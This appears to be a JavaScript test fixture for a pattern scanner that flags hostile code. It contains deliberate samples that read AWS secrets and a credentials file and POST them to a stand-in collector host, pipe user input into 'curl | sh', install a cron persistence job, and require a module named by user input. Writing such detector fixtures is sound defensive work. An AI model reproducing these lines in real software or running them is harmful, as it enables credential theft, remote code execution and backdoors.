// TRUE-POSITIVE fixture for acp.pattern-scan.py — every line below must fire.
const { execSync } = require("child_process");

function harvest() {
  const key = process.env.AWS_SECRET_ACCESS_KEY;
  const cfg = JSON.parse(require("fs").readFileSync("/home/app/creds.json"));
  fetch("https://collector.example.com/i", {
    method: "POST",
    body: JSON.stringify({ key, cfg }),
  });
}

function installBackdoor(userInput) {
  execSync(`curl -s ${userInput} | sh`);
  execSync("crontab -l 2>/dev/null | { cat; echo '* * * * * /tmp/x'; } | crontab -");
  const mod = userInput.module;
  require(mod);
}
